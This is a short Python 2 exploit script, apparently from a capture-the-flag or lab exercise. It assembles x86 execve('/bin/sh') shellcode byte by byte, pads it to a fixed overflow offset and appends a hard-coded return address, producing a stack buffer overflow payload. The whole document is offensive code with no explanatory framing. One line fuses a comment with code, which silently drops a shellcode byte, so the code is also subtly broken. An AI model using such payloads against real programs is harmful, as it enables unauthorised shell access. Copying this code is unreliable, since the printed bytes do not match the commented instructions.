import struct
# xor ecx, ecx
shell  = '\x31'
shell += '\xc9'
# mul ecxshell += '\xf7'
shell += '\xe1'
# push ecx
shell += '\x51'
# push 0x68732f2f   ;; hs//
shell += '\x68'
shell += '\x2f\x2f\x73\x68'
# push 0x6e69622f   ;; nib/
shell += '\x68'
shell += '\x2f\x62\x69\x6e'
# mov ebx, esp
shell += '\x89'
shell += '\xe3'
# mov al, 11
shell += '\xb0'
shell += '\x0b'
shell += '\xcd'
# int 0x80
shell += '\x80'
# null terminate
shell += "\x00"

padd = 'a' * (0x4c + 0x4 - len(shell))
shell_addr = struct.pack("<I", 0x804a008)
print shell + padd + shell_addr
